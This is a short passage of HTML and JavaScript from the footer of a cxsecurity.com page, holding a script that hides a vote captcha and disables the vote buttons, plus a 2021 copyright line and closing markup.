document.getElementById('voteCaptcha').style.display = 'none'; document.getElementById("dodatnie").disabled = true; document.getElementById("ujemne").disabled = true;
 }</script><HR>
Copyright <b>2021</b>, cxsecurity.com<P>&nbsp;
    </TD>
    <TD id='boki'></TD>
    <TD width="6%"></TD>
	</TR>
</TABLE>
<a href="#" class="back-to-top">Back to Top</a>
    </DIV>
    </DIV>
</BODY>
</HTML>
